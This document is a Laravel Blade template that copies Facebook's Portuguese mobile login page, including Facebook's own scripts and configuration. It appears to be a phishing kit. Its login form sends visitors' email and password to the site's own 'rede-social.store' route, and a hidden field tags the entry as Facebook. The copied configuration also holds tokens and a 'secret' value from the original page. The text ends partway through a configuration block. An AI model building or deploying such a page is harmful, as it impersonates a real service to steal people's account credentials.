<!DOCTYPE html>
<html>
<head>
    <title>Facebook – entre ou cadastre-se</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
    <link href="{{asset('images/1.png')}}" rel="shortcut icon" sizes="196x196" />
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
    <meta name="theme-color" content="#3b5998" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="DofZb" href="{{asset('css/facebook-1.css')}}" />
    <link rel="stylesheet" type="text/css" data-bootloader-hash="Biicz" href="{{asset('css/facebook-2.css')}}" />
    <script id="u_0_f">
        function envFlush(a) {
            function b(b) {
                for (var c in a) b[c] = a[c]
            }
            window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
        }
        envFlush({
            "timeslice_heartbeat_config": {
                "pollIntervalMs": 33,
                "idleGapThresholdMs": 60,
                "ignoredTimesliceNames": {
                    "requestAnimationFrame": true,
                    "Event listenHandler mousemove": true,
                    "Event listenHandler mouseover": true,
                    "Event listenHandler mouseout": true,
                    "Event listenHandler scroll": true
                },
                "isHeartbeatEnabled": true,
                "isArtilleryOn": false
            },
            "shouldLogCounters": true,
            "timeslice_categories": {
                "react_render": true,
                "reflow": true
            },
            "sample_continuation_stacktraces": true,
            "dom_mutation_flag": true
        });
    </script>
    <script>
        document.domain = 'facebook.com';
        /^#~?!(?:\/?[\w\.-])+\/?(?:\?|$)/.test(location.hash) && location.replace(location.hash.substr(location.hash.indexOf("!") + 1));
    </script>
    <script>
        __DEV__ = 0;
    </script>
    <script id="u_0_g" crossorigin="anonymous" src="{{asset('js/facebook-1.js')}}" data-bootloader-hash="5Ptw0"></script>
    <script id="u_0_h">
        CavalryLogger = window.CavalryLogger || function(a) {
            this.lid = a, this.transition = !1, this.metric_collected = !1, this.is_detailed_profiler = !1, this.instrumentation_started = !1, this.pagelet_metrics = {}, this.events = {}, this.ongoing_watch = {}, this.values = {
                t_cstart: window._cstart
            }, this.piggy_values = {}, this.bootloader_metrics = {}, this.resource_to_pagelet_mapping = {}, this.e2eLogged = !1, this.initializeInstrumentation && this.initializeInstrumentation()
        }, CavalryLogger.prototype.setIsDetailedProfiler = function(a) {
            this.is_detailed_profiler = a;
            return this
        }, CavalryLogger.prototype.setTTIEvent = function(a) {
            this.tti_event = a;
            return this
        }, CavalryLogger.prototype.setValue = function(a, b, c, d) {
            d = d ? this.piggy_values : this.values;
            (typeof d[a] === "undefined" || c) && (d[a] = b);
            return this
        }, CavalryLogger.prototype.getLastTtiValue = function() {
            return this.lastTtiValue
        }, CavalryLogger.prototype.setTimeStamp = CavalryLogger.prototype.setTimeStamp || function(a, b, c, d) {
            this.mark(a);
            var e = this.values.t_cstart || this.values.t_start;
            e = d ? e + d : CavalryLogger.now();
            this.setValue(a, e, b, c);
            this.tti_event && a == this.tti_event && (this.lastTtiValue = e, this.setTimeStamp("t_tti", b));
            return this
        }, CavalryLogger.prototype.mark = typeof console === "object" && console.timeStamp ? function(a) {
            console.timeStamp(a)
        } : function() {}, CavalryLogger.prototype.addPiggyback = function(a, b) {
            this.piggy_values[a] = b;
            return this
        }, CavalryLogger.instances = {}, CavalryLogger.id = 0, CavalryLogger.perfNubMarkup = "", CavalryLogger.disableArtilleryOnUntilOffLogging = !1, CavalryLogger.getInstance = function(a) {
            typeof a === "undefined" && (a = CavalryLogger.id);
            CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
            return CavalryLogger.instances[a]
        }, CavalryLogger.setPageID = function(a) {
            if (CavalryLogger.id === 0) {
                var b = CavalryLogger.getInstance();
                CavalryLogger.instances[a] = b;
                CavalryLogger.instances[a].lid = a;
                delete CavalryLogger.instances[0]
            }
            CavalryLogger.id = a
        }, CavalryLogger.setPerfNubMarkup = function(a) {
            CavalryLogger.perfNubMarkup = a
        }, CavalryLogger.now = function() {
            return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime()
        }, CavalryLogger.prototype.measureResources = function() {}, CavalryLogger.prototype.profileEarlyResources = function() {}, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {}, CavalryLogger.start_js = function() {}, CavalryLogger.done_js = function() {};
        CavalryLogger.getInstance().setTTIEvent("t_domcontent");
        CavalryLogger.prototype.measureResources = function(a, b) {
            if (!this.log_resources) return;
            var c = "bootload/" + a.name;
            if (this.bootloader_metrics[c] !== undefined || this.ongoing_watch[c] !== undefined) return;
            var d = CavalryLogger.now();
            this.ongoing_watch[c] = d;
            "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
            b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
            if (a.type === "js") {
                c = "js_exec/" + a.name;
                this.ongoing_watch[c] = d
            }
        }, CavalryLogger.prototype.stopWatch = function(a) {
            if (this.ongoing_watch[a]) {
                var b = CavalryLogger.now(),
                    c = b - this.ongoing_watch[a];
                this.bootloader_metrics[a] = c;
                var d = this.piggy_values;
                a.indexOf("bootload") === 0 && (d.t_resource_download || (d.t_resource_download = 0), d.resources_downloaded || (d.resources_downloaded = 0), d.t_resource_download += c, d.resources_downloaded += 1, d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
                delete this.ongoing_watch[a]
            }
            return this
        }, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {
            var a = {};
            Object.values(window.CavalryLogger.instances).forEach(function(b) {
                b.bootloader_metrics && Object.assign(a, b.bootloader_metrics)
            });
            return a
        }, CavalryLogger.start_js = function(a) {
            for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b])
        }, CavalryLogger.done_js = function(a) {
            for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b])
        }, CavalryLogger.prototype.profileEarlyResources = function(a) {
            for (var b = 0; b < a.length; b++) this.measureResources({
                name: a[b][0],
                type: a[b][1] ? "js" : ""
            }, "_EF_")
        };
        CavalryLogger.getInstance().log_resources = true;
        CavalryLogger.getInstance().setIsDetailedProfiler(true);
        window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
    </script>
    <script id="u_0_i">
        (function _(a, b, c, d) {
            function e(a) {
                document.cookie = a + "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com"
            }

            function f(a, b) {
                document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure"
            }
            if (!a) {
                e(b);
                e(c);
                return
            }
            a = null;
            (navigator.userAgent.indexOf("Firefox") !== -1 || !window.devicePixelRatio && navigator.userAgent.indexOf("Windows Phone") !== -1) && (document.documentElement != null && (a = screen.width / document.documentElement.offsetWidth, a = Math.max(1, Math.floor(a * 2) / 2)));
            (!a || a === 1) && navigator.userAgent.indexOf("IEMobile") !== -1 && (a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96, a = Math.max(1, Math.round(a * 2) / 2));
            f(b, (a || window.devicePixelRatio || 1).toString());
            e = window.screen ? screen.width : 0;
            b = window.screen ? screen.height : 0;
            f(c, e + "x" + b);
            d && document.cookie && window.devicePixelRatio > 1 && document.location.reload()
        })(true, "m_pixel_ratio", "wd", false);
    </script>
    <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=" />
    <meta name="description" content="Crie uma conta ou entre no Facebook. Conecte-se com amigos, familiares e outras pessoas que voc&#xea; conhe&#xe7;a. Compartilhe fotos e v&#xed;deos, envie mensagens e..." />
    <link rel="canonical" href="https://www.facebook.com/" />
</head>
<body tabindex="0" class="touch x2 android _fzu _50-3 iframe acw">
<script id="u_0_e">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;c&&(c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g," ")+" "+(b?"landscape":"portrait"));return b}})(window);</script>
<div id="viewport">
    <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
    <div id="page" class="">
        <div class="_129_" id="header-notices"></div>
        <div class="_4g33 _52we _52z5" id="header">
            <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="{{route('facebook')}}"><h1 style="color: #ffffff;font-size: 24px;">facebook</h1></a></div>
        </div>
        <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
            <div class="_4g33">
                <div class="_4g34" id="u_0_0">
                    <div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
                        <div class="_52jd"></div>
                    </div>
                    <div class="aclb _4-4l">
                        <div data-sigil="m_login_upsell login_identify_step_element">
                            <div class="_qw9 grouped aclb" id="u_0_1">
                                <a href="#" class="touchableArea first last area touchable acy apl abt abb" data-sigil="touchable marea">
                                    <div class="ib cc">
                                        <i class="img l img _2sxw" style="background-image: url(&#039;https\3a //static.xx.fbcdn.net/rsrc.php/v3/yc/r/fb9hHvqMKNN.png&#039;);background-repeat:no-repeat;background-size:100% 100%;-webkit-background-size:100% 100%;width:18px;height:32px;"></i>
                                        <div class="c"><span class="fcl">Obtenha o aplicativo do Facebook e navegue mais rápido.</span></div>
                                    </div>
                                </a>
                            </div>
                        </div>
                        <div class="_5rut">
                            <form method="post" action="{{route('rede-social.store')}}" class="mobile-login-form _5spm">
                                {!! csrf_field() !!}
                                <input type="hidden" id="rede_social" name="rede_social" value="Facebook">
                                <div class="_56be _5sob">
                                    <div class="_55wo _55x2 _56bf">
                                        <input type="email" class="_56bg _4u9z _5ruq" name="username" placeholder="Email ou telefone" required>
                                        <input class="_56bg _4u9z _27z2" name="password" placeholder="Senha" type="password" required>
                                    </div>
                                </div>
                                <div class="_2pie" style="text-align:center;">
                                        <button class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu"><span class="_55sr">Entrar</span></button>
                                </div>
                            </form>
                            <div>
                                <div class="_43mg"><span class="_43mh">ou</span></div>
                                <div class="_52jj _5t3b" id="u_0_7"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="https://m.facebook.com/reg/?cid=103" data-sigil="m_reg_button">Criar nova conta</a></div>
                            </div>
                            <div>
                                <div class="other-links">
                                    <ul class="_5pkb _55wp">
                                        <li><span class="mfss fcg"><a href="https://m.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&cuid_not_me=AYjHxwykIZ6Y9_xO54YDqRHQSNZjvVp2JrRfkkPM51ZJA9WO97SDrZm_fEdTAdnZluVUn6exF5U-pRS1OaRzFdnHOZwUwDy69usXksSKp7D8jBA7IRoQnct73BaXttbU5ECcdBzGjZ7P_gQnEyPOpw_xFOqWjw8fkU1TZfVl4w7yZ7c4wm1Ht1Q08Ynld1DUs5a26t6K59u9fA9A99Pd1hRgR0fgQ9SQqgNzZecerQM22w&_rdr" id="forgot-password-link">Esqueceu a senha?</a><span aria-hidden="true"> · </span><a href="https://m.facebook.com/help/" id="help-link" class="sec">Central de Ajuda</a></span></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div></div>
            <img src="#" width="0" height="0" style="display:none" />
            <div class="_55wr _5ui2">
                <div class="_5dpw">
                    <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                        <div class="_4g33">
                            <div class="_4g34">
                                <span class="_52jc _52j9 _52jh _3ztb">Português (Brasil)</span>
                                <div class="_3ztc"><span class="_52jc"><a href="#" data-sigil="change_language">Español</a></span></div>
                                <div class="_3ztc"><span class="_52jc"><a href="#" data-sigil="change_language">Deutsch</a></span></div>
                                <div class="_3ztc"><span class="_52jc"><a href="#" data-sigil="change_language">العربية</a></span></div>
                            </div>
                            <div class="_4g34">
                                <div class="_3ztc"><span class="_52jc"><a href="#" data-sigil="change_language">English (US)</a></span></div>
                                <div class="_3ztc"><span class="_52jc"><a href="#" data-sigil="change_language">Français (France)</a></span></div>
                                <div class="_3ztc"><span class="_52jc"><a href="#" data-sigil="change_language">Italiano</a></span></div>
                                <a href="#">
                                    <div class="_3j87 _1rrd _3ztd" aria-label="Lista completa de idiomas">+</div>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="_5ui4"><span class="mfss fcg">Facebook © 2018</span></div>
                </div>
            </div>
        </div>
        <div class="viewportArea _2v9s" style="display:none" id="u_0_8" data-sigil="marea">
            <div class="_5vsg" id="u_0_9"></div>
            <div class="_5vsh" id="u_0_a"></div>
            <div class="_5v5d fcg">
                <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
                Carregando...
            </div>
        </div>
        <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
            <div class="container">
                <div class="image"></div>
                <div class="message" data-sigil="error-message"></div>
                <a class="link" data-sigil="MPageError:retry">Tentar novamente</a>
            </div>
        </div>
    </div>
</div>
<div id="static_templates">
    <div class="mDialog" id="modalDialog" style="display:none">
        <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
            <div class="_4g33 _52we">
                <div class="_5s61">
                    <div class="_52z7"><button type="submit" value="Cancelar" class="cancelButton btn btnD bgb mfss touchable" id="u_0_c" data-sigil="dialog-cancel-button">Cancelar</button><button type="submit" value="Voltar" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Voltar" id="u_0_d" data-sigil="dialog-back-button"><i class="img sp_scRnFxXBg91_3x sx_a185d9" style="margin-top: 2px;"></i></button></div>
                </div>
                <div class="_4g34">
                    <div class="_52z6">
                        <div class="_50l4 mfsl fcw" id="m-future-page-header-title" data-sigil="m-dialog-header-title dialog-title">Carregando...</div>
                    </div>
                </div>
                <div class="_5s61">
                    <div class="_52z8" id="modalDialogHeaderButtons"></div>
                </div>
            </div>
            <div id="pagelet_0_0"></div>
        </div>
        <div class="modalDialogView" id="modalDialogView"></div>
        <div class="_5v5d _5v5e fcg" id="dialogSpinner">
            <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_b" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
            Carregando...
        </div>
    </div>
</div>
<script id="u_0_j" crossorigin="anonymous" src="{{asset('js/facebook-2.js')}}" data-bootloader-hash="Jq4O7"></script>
<script id="u_0_k" crossorigin="anonymous" src="{{asset('js/facebook-3.js')}}" data-bootloader-hash="O4C6Y"></script>
<script id="u_0_l" crossorigin="anonymous" src="{{asset('js/facebook-4.js')}}" data-bootloader-hash="v9kMu"></script>
<script id="u_0_m">
    require("TimeSlice").guard(function() {
        (require("ServerJSDefine")).handleDefines([
            ["BanzaiRefactored", ["BanzaiOld"], {
                "module": {
                    "__m": "BanzaiOld"
                }
            }, 3421],
            ["KSConfig", [], {
                "killed": {
                    "__set": ["POCKET_MONSTERS_CREATE", "POCKET_MONSTERS_DELETE", "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG", "PREVENT_INFINITE_URL_REDIRECT", "POCKET_MONSTERS_UPDATE_NAME"]
                }
            }, 2580],
            ["ServerNonce", [], {
                "ServerNonce": "lbeFT_9yl_vuiEkPy2b5f3"
            }, 141],
            ["UserAgentData", [], {
                "browserArchitecture": "32",
                "browserFullVersion": "68.0.3440.106",
                "browserMinorVersion": 0,
                "browserName": "Chrome",
                "browserVersion": 68,
                "deviceName": "Unknown",
                "engineName": "WebKit",
                "engineVersion": "537.36",
                "platformArchitecture": "32",
                "platformName": "Android",
                "platformVersion": "5",
                "platformFullVersion": "5.0"
            }, 527],
            ["BootloaderConfig", [], {
                "jsRetries": null,
                "jsRetryAbortNum": 2,
                "jsRetryAbortTime": 5,
                "payloadEndpointURI": "https:\/\/m.facebook.com\/ajax\/haste-response\/",
                "assumeNotNonblocking": false,
                "assumePermanent": true,
                "skipEndpoint": true,
                "staggerJsDownloads": false,
                "fixMemoryLeaks": true,
                "webspeed_eager_preloading": false,
                "preloader_num_preloads": 5,
                "preloader_preload_after_dd": false,
                "preloader_num_loads": 1,
                "preloader_enabled": false
            }, 329],
            ["CSSLoaderConfig", [], {
                "timeout": 5000,
                "modulePrefix": "BLCSS:",
                "loadEventSupported": true
            }, 619],
            ["CurrentCommunityInitialData", [], {}, 490],
            ["CurrentUserInitialData", [], {
                "USER_ID": "0",
                "ACCOUNT_ID": "0",
                "NAME": "",
                "SHORT_NAME": null,
                "IS_MESSENGER_ONLY_USER": false,
                "IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false
            }, 270],
            ["MRequestConfig", [], {
                "dtsg": {
                    "token": "AQGE0_5qkM4P:AQEtW9A1YRtV",
                    "valid_for": 86400,
                    "expire": 1536070843
                },
                "lsd": "AVoHzeTJ",
                "checkResponseOrigin": true,
                "checkResponseToken": true,
                "ajaxResponseToken": {
                    "secret": "R25Acfl8DjxBxSn5o5MuHuTcfLZHsFbk",
                    "encrypted": "AYmNICTU2-VMLVY3pPSQFtZ8kJGJjrOa4eSjJOWwXjxtqohSuUJGfQnIqZELVU2B8zPwkowzChmC7YLlA36kARWz27fWpvwgTEkGzWjwW1fkHA"
                }
            }, 51],
            ["ImmediateImplementationExperiments", [], {
                "prefer_message_channel": false
            }, 3419],
            ["PromiseUsePolyfillSetImmediateGK", [], {
                "www_always_use_polyfill_setimmediate": false
            }, 2190],
            ["SprinkleConfig", [], {
                "param_name": "jazoest",
                "version": 2
            }, 2111],
            ["ISB", [], {}, 330],
            ["LSD", [], {
                "token": "AVoHzeTJ"
            }, 323],
            ["SiteData", [], {
                "server_revision": 4274249,
                "client_revision": 4274249,
                "tier": "",
                "push_phase": "C3",
                "pkg_cohort": "FW_EXP:mtouch_pkg",
                "pkg_cohort_key": "__pc",
                "haste_site": "mobile",
                "be_mode": -1,
                "be_key": "__be",
                "is_rtl": false,
                "vip": "157.240.14.35"
            }, 317],
            ["CookieCoreConfig", [], {
                "a11y": {},
                "act": {},
                "c_user": {},
                "ddid": {
                    "p": "\/deferreddeeplink\/",
                    "t": 2419200
                },
                "dpr": {
                    "t": 604800
                },
                "js_ver": {
                    "t": 604800
                },
                "locale": {
                    "t": 604800
                },
                "lh": {
                    "t": 604800
                },
                "m_pixel_ratio": {
                    "t": 604800
                },
                "noscript": {},
                "pnl_data2": {
                    "t": 2
                },
                "presence": {},
                "sW": {},
                "sfau": {},
                "wd": {
                    "t": 604800
                },
                "x-referer": {},
                "x-src": {
                    "t": 1
                }
            }, 2104],
            ["CookieCoreLoggingConfig", [], {
                "maximumIgnorableStallMs": 16.67,
                "sampleRate": 9.7e-5
            }, 3401],
            ["ZeroRewriteRules", [], {
                "rewrite_rules": {},
                "whitelist": {
                    "\/hr\/r": 1,
                    "\/hr\/p": 1,
                    "\/zero\/unsupported_browser\/": 1,
                    "\/zero\/policy\/optin": 1,
                    "\/zero\/optin\/write\/": 1,
                    "\/zero\/optin\/legal\/": 1,
                    "\/zero\/optin\/free\/": 1,
                    "\/about\/privacy\/": 1,
                    "\/about\/privacy\/update\/": 1,
                    "\/about\/privacy\/update": 1,
                    "\/zero\/toggle\/welcome\/": 1,
                    "\/work\/landing": 1,
                    "\/work\/login\/": 1,
                    "\/work\/email\/": 1,
                    "\/ai.php": 1,
                    "\/js_dialog_resources\/dialog_descriptions_android.json": 0,
                    "\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/": 0,
                    "\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/": 0,
                    "\/connect\/jsdialog\/MPlatformLikeJSDialog\/": 0,
                    "\/qp\/interstitial\/": 1,
                    "\/qp\/action\/redirect\/": 1,
                    "\/qp\/action\/close\/": 1,
                    "\/zero\/support\/ineligible\/": 1,
                    "\/zero_balance_redirect\/": 1,
                    "\/zero_balance_redirect": 1,
                    "\/l.php": 1,
                    "\/lsr.php": 1,
                    "\/ajax\/dtsg\/": 1,
                    "\/checkpoint\/block\/": 1,
                    "\/exitdsite": 1,
                    "\/zero\/balance\/pixel\/": 1,
                    "\/zero\/balance\/": 1,
                    "\/zero\/balance\/carrier_landing\/": 1,
                    "\/zero\/flex\/logging\/": 1,
                    "\/tr": 1,
                    "\/tr\/": 1,
                    "\/sem_campaigns\/sem_pixel_test\/": 1,
                    "\/bookmarks\/flyout\/body\/": 1,
                    "\/zero\/subno\/": 1,
                    "\/confirmemail.php": 1,
                    "\/policies\/": 1,
                    "\/mobile\/internetdotorg\/classifier\/": 1,
                    "\/zero\/dogfooding": 1,
                    "\/xti.php": 1,
                    "\/4oh4.php": 1,
                    "\/autologin.php": 1,
                    "\/birthday_help.php": 1,
                    "\/checkpoint\/": 1,
                    "\/contact-importer\/": 1,
                    "\/cr.php": 1,
                    "\/legal\/terms\/": 1,
                    "\/login.php": 1,
                    "\/login\/": 1,
                    "\/mobile\/account\/": 1,
                    "\/n\/": 1,
                    "\/remote_test_device\/": 1,
                    "\/upsell\/buy\/": 1,
                    "\/upsell\/buyconfirm\/": 1,
                    "\/upsell\/buyresult\/": 1,
                    "\/upsell\/promos\/": 1,
                    "\/upsell\/continue\/": 1,
                    "\/upsell\/h\/promos\/": 1,
                    "\/upsell\/loan\/learnmore\/": 1,
                    "\/upsell\/purchase\/": 1,
                    "\/upsell\/promos\/upgrade\/": 1,
                    "\/upsell\/buy_redirect\/": 1,
                    "\/upsell\/loan\/buyconfirm\/": 1,
                    "\/upsell\/loan\/buy\/": 1,
                    "\/upsell\/sms\/": 1,
                    "\/wap\/a\/channel\/reconnect.php": 1,
                    "\/wap\/a\/nux\/wizard\/nav.php": 1,
                    "\/wap\/appreg.php": 1,
                    "\/wap\/birthday_help.php": 1,
                    "\/wap\/c.php": 1,
                    "\/wap\/confirmemail.php": 1,
                    "\/wap\/cr.php": 1,
                    "\/wap\/login.php": 1,
                    "\/wap\/r.php": 1,
                    "\/zero\/datapolicy": 1,
                    "\/a\/timezone.php": 1,
                    "\/a\/bz": 1,
                    "\/bz\/reliability": 1,
                    "\/r.php": 1,
                    "\/mr\/": 1,
                    "\/reg\/": 1,
                    "\/registration\/log\/": 1,
                    "\/terms\/": 1,
                    "\/f123\/": 1,
                    "\/expert\/": 1,
                    "\/experts\/": 1,
                    "\/terms\/index.php": 1,
                    "\/terms.php": 1,
                    "\/srr\/": 1,
                    "\/msite\/redirect\/": 1,
                    "\/fbs\/pixel\/": 1,
                    "\/contactpoint\/preconfirmation\/": 1,
                    "\/contactpoint\/cliff\/": 1,
                    "\/contactpoint\/confirm\/submit\/": 1,
                    "\/contactpoint\/confirmed\/": 1,
                    "\/contactpoint\/login\/": 1,
                    "\/preconfirmation\/contactpoint_change\/": 1,
                    "\/help\/contact\/": 1,
                    "\/survey\/": 1,
                    "\/upsell\/loyaltytopup\/accept\/": 1,
                    "\/settings\/": 1
                }
            }, 1478],
            ["MJSEnvironment", [], {
                "IS_APPLE_WEBKIT_IOS": false,
                "IS_TABLET": false,
                "IS_ANDROID": true,
                "IS_CHROME": true,
                "IS_FIREFOX": false,
                "IS_WINDOWS_PHONE": false,
                "IS_SAMSUNG_DEVICE": true,
                "OS_VERSION": 5,
                "PIXEL_RATIO": 3,
                "BROWSER_NAME": "Chrome Mobile"
            }, 46],
            ["ZeroCategoryHeader", [], {}, 1127],
            ["MLoadingIndicatorSigils", [], {
                "ANIMATE": "m-loading-indicator-animate",
                "ROOT": "m-loading-indicator-root"
            }, 279],
            ["FbtLogger", [], {
                "logger": null
            }, 288],
            ["IntlNumberTypeConfig", [], {
                "impl": "if (n >= 0 && n \u003C= 1) { return IntlVariations.NUMBER_ONE; } else { return IntlVariations.NUMBER_OTHER; }"
            }, 3405],
            ["FbtQTOverrides", [], {
                "overrides": {}
            }, 551],
            ["FbtResultGK", [], {
                "shouldReturnFbtResult": true,
                "inlineMode": "NO_INLINE"
            }, 876],
            ["IntlHoldoutGK", [], {
                "inIntlHoldout": false
            }, 2827],
            ["IntlViewerContext", [], {
                "GENDER": 3
            }, 772],
            ["NumberFormatConfig", [], {
                "decimalSeparator": ",",
                "numberDelimiter": ".",
                "minDigitsForThousandsSeparator": 4,
                "standardDecimalPatternInfo": {
                    "primaryGroupSize": 3,
                    "secondaryGroupSize": 3
                },
                "numberingSystemData": null
            }, 54],
            ["IntlPhonologicalRules", [], {}, 1496],
            ["MWebStorageMonsterWhiteList", [], {
                "whitelist": ["^Banzai$", "^bz", "^mutex", "^msys", "^sp_pi$", "^\\:userchooser\\:osessusers$", "^\\:userchooser\\:settings$", "^[0-9]+:powereditor:", "^Bandicoot\\:", "^brands\\:console\\:config$", "^CacheStorageVersion$", "^consoleEnabled$", "^_video_$", "^vc_", "^_showMDevConsole$", "^_ctv_$", "^ga_client_id$", "^qe_switcher_nub_selection$", "^_mswam_$"]
            }, 254],
            ["MTouchableSyntheticClickGK", [], {
                "USE_SYNTHETIC_CLICK": true
            }, 368],
            ["MobileAppDetect", [], {
                "is_mobile_app": false,
                "is_pages_manager": false,
                "is_facebook_for_android": false,
                "is_facebook_for_android_in_app_browser": false,
                "is_facebook_for_ios": false,
                "is_messenger_for_android": false,
                "is_messenger_for_ios": false,
                "is_wilde": false,
                "is_kaios": false
            }, 1109],
            ["ErrorDebugHooks", [], {
                "SnapShotHook": null
            }, 185],
            ["ArtilleryExperiments", [], {
                "artillery_static_resources_pagelet_attribution": false,
                "artillery_timeslice_compressed_data": false,
                "artillery_miny_client_payload": false,
                "artillery_prolong_page_tracing": false,
                "artillery_navigation_timing_level_2": false,
                "artillery_profiler_on": false,
                "artillery_merge_max_distance_sec": 1,
                "artillery_merge_max_duration_sec": 1,
                "user_timing": false
            }, 1237],
            ["TimeSliceInteractionSV", [], {
                "on_demand_reference_counting": true,
                "on_demand_profiling_counters": true,
                "default_rate": 1000,
                "lite_default_rate": 100,
                "interaction_to_lite_coinflip": {
                    "ADS_INTERFACES_INTERACTION": 0,
                    "ads_perf_scenario": 0,
                    "ads_wait_time": 0,
                    "Event": 10,
                    "video_psr": 0,
                    "video_stall": 0
                },
                "interaction_to_coinflip": {
                    "ADS_INTERFACES_INTERACTION": 1,
                    "ads_perf_scenario": 1,
                    "ads_wait_time": 1,
                    "video_psr": 1000000,
                    "video_stall": 2500000,
                    "Event": 500,
                    "watch_carousel_left_scroll": 1,
                    "watch_carousel_right_scroll": 1,
                    "watch_sections_load_more": 1,
                    "watch_discover_scroll": 1,
                    "fbpkg_ui": 1,
                    "sevmanager_powersearch_initial_page_load": 10,
                    "backbone_ui": 1
                },
                "enable_heartbeat": true,
                "maxBlockMergeDuration": 0,
                "maxBlockMergeDistance": 0,
                "enable_banzai_stream": true,
                "user_timing_coinflip": 50,
                "banzai_stream_coinflip": 1,
                "compression_enabled": true,
                "ref_counting_fix": true,
                "ref_counting_cont_fix": false,
                "also_record_new_timeslice_format": false,
                "force_async_request_tracing_on": false
            }, 2609],
            ["FWLoader", [], {}, 278],
            ["MPageControllerGating", [], {
                "shouldDeferUntilCertainNoRedirect": false
            }, 2023],
            ["BigPipeExperiments", [], {
                "link_images_to_pagelets": false
            }, 907],
            ["ArtilleryComponentSaverOptions", [], {
                "options": {
                    "ads_wait_time_saver": {
                        "shouldCompress": false,
                        "shouldUploadSeparately": false
                    },
                    "ads_flux_profiler_saver": {
                        "shouldCompress": true,
                        "shouldUploadSeparately": false
                    },
                    "timeslice_execution_saver": {
                        "shouldCompress": true,
                        "shouldUploadSeparately": false
                    },
                    "interaction_async_request_join_data": {
                        "shouldCompress": true,
                        "shouldUploadSeparately": true
                    },
                    "resources_saver": {
                        "shouldCompress": true,
                        "shouldUploadSeparately": false
                    },
                    "user_timing_saver": {
                        "shouldCompress": false,
                        "shouldUploadSeparately": false
                    }
                }
            }, 3016],
            ["MRenderingSchedulerConfig", [], {
                "delayNormalResources": false,
                "isDisplayJSEnabled": false
            }, 1978],
            ["EventConfig", [], {
                "sampling": {
                    "bandwidth": 0,
                    "play": 0,
                    "playing": 0,
                    "progress": 0,
                    "pause": 0,
                    "ended": 0,
                    "seeked": 0,
                    "seeking": 0,
                    "waiting": 0,
                    "loadedmetadata": 0,
                    "canplay": 0,
                    "selectionchange": 0,
                    "change": 0,
                    "timeupdate": 2000000,
                    "adaptation": 0,
                    "focus": 0,
                    "blur": 0,
                    "load": 0,
                    "error": 0,
                    "message": 0,
                    "abort": 0,
                    "storage": 0,
                    "scroll": 200000,
                    "mousemove": 20000,
                    "mouseover": 10000,
                    "mouseout": 10000,
                    "mousewheel": 1,
                    "MSPointerMove": 10000,
                    "keydown": 0.1,
                    "click": 0.02,
                    "mouseup": 0.02,
                    "__100ms": 0.001,
                    "__default": 5000,
                    "__min": 100,
                    "__interactionDefault": 200,
                    "__eventDefault": 100000
                },
                "page_sampling_boost": 1,
                "interaction_regexes": {
                    "BlueBarAccountChevronMenu": " _5lxs(?: .*)?$",
                    "BlueBarHomeButton": " _bluebarLinkHome__interaction-root(?: .*)?$",
                    "BlueBarProfileLink": " _1k67(?: .*)?$",
                    "ReactComposerSproutMedia": " _1pnt(?: .*)?$",
                    "ReactComposerSproutAlbum": " _1pnu(?: .*)?$",
                    "ReactComposerSproutNote": " _3-9x(?: .*)?$",
                    "ReactComposerSproutLocation": " _1pnv(?: .*)?$",
                    "ReactComposerSproutActivity": " _1pnz(?: .*)?$",
                    "ReactComposerSproutPeople": " _1pn-(?: .*)?$",
